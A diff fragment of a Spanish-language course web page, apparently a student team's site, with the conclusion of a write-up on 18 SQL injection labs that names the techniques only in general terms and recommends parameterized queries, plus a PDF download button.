+            La resolución sistemática de estos 18 laboratorios demuestra que la inyección SQL ha evolucionado significativamente. Ya no se trata únicamente de eludir formularios de inicio de sesión clásicos. Como se comprobó en los laboratorios avanzados, los vectores de ataque modernos aprovechan características intrínsecas de los motores de bases de datos (como el análisis asíncrono XML en Oracle o las funciones de tiempo en PostgreSQL) para exfiltrar información, incluso a través de firewalls perimetrales (WAF) utilizando técnicas de ofuscación de entidades (Hackvertor). La defensa más efectiva sigue siendo arquitectónica: las Consultas Parametrizadas eliminan de raíz la posibilidad de que el input del usuario sea interpretado como código SQL ejecutable.
+            </p>
+        </div>
+
+      </div>
+
+      {/* --- ZONA DE DESCARGA (Botón PDF) --- */}
+      <div class="mt-16 pt-10 border-t border-gray-200 dark:border-gray-800 flex flex-col items-center gap-6">
+        
+        <div class="text-center mb-2">
+            <h3 class="text-lg font-bold text-gray-800 dark:text-gray-200">Respaldo Académico y Documentación Formal</h3>
+            <p class="text-sm text-gray-500 max-w-lg mt-1">
+            Presiona el siguiente botón para exportar la versión formal del documento en PDF correspondiente a esta práctica, el cual incluye el marco teórico completo y las capturas de pantalla de la rúbrica.
+            </p>
+        </div>
+
+        <a 
+          href={INFO_TAREA.pdf} 
+          download={`Act08-Equipo5.pdf`} 
+          class="flex items-center gap-2 px-8 py-3 text-base font-bold text-white transition-all bg-blue-600 rounded-full hover:bg-blue-700 hover:shadow-lg hover:shadow-blue-500/30 active:scale-95"
+        >
+          <Link class="size-5" />
+          Descargar PDF de la Tarea 8
+        </a>
+
+        <a 
+          href="/#tareas" 
+          class="text-gray-500 hover:text-blue-500 hover:underline flex items-center gap-2 text-sm font-medium transition mt-4"
+        >
+          ← Regresar a la lista de tareas
+        </a>
+
+      </div>
+
+    </SectionContainer>
+  </main>
+</Layout>
